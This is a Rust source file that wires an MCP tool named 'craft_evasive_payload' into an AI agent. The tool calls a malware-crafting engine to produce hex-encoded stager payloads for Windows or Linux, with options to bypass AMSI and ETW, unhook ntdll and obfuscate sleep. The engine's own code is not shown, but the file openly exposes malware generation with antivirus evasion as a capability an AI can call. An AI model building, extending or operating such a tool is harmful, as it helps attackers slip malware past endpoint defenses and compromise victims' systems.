use application::{McpTool, PayloadEngine};
use async_trait::async_trait;
use core_domain::PayloadSpec;
use malware_crafter::MalwareCraftingEngine;

pub struct CraftEvasivePayloadTool;

#[async_trait]
impl McpTool for CraftEvasivePayloadTool {
    fn name(&self) -> &str {
        "craft_evasive_payload"
    }

    fn description(&self) -> &str {
        "Generates an obfuscated payload bypassing standard AMSI/ETW hooks. Output is hex-encoded."
    }

    fn schema(&self) -> serde_json::Value {
        serde_json::json!({
            "name": "craft_evasive_payload",
            "type": "object",
            "properties": {
                "target_os": { "type": "string", "enum": ["windows", "linux"] },
                "arch": { "type": "string", "enum": ["x86", "x64", "arm64"] },
                "evasion_flags": {
                    "type": "array",
                    "items": { "type": "string", "enum": ["no_syscalls", "sleep_obfuscation", "unhook_ntdll"] }
                },
                "bypass_amsi": { "type": "boolean" },
                "bypass_etw": { "type": "boolean" },
                "encoder": { "type": "string", "enum": ["xor", "nop_sled"] }
            },
            "required": ["target_os", "arch"]
        })
    }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<serde_json::Value> {
        let spec = PayloadSpec {
            os: params["target_os"].as_str().unwrap_or("linux").to_string(),
            architecture: params["arch"].as_str().unwrap_or("x64").to_string(),
            bypass_amsi: params["bypass_amsi"].as_bool().unwrap_or(false),
            bypass_etw: params["bypass_etw"].as_bool().unwrap_or(false),
            encoder: params["encoder"].as_str().map(str::to_string),
            bad_chars: vec![0x00],
        };

        let engine = MalwareCraftingEngine::from_spec(&spec);
        let payload = engine.generate_stager(&spec).await?;
        let hex = payload.iter().map(|b| format!("{:02x}", b)).collect::<String>();

        Ok(serde_json::json!({
            "target_os": spec.os,
            "arch": spec.architecture,
            "size_bytes": payload.len(),
            "payload_hex": hex
        }))
    }
}
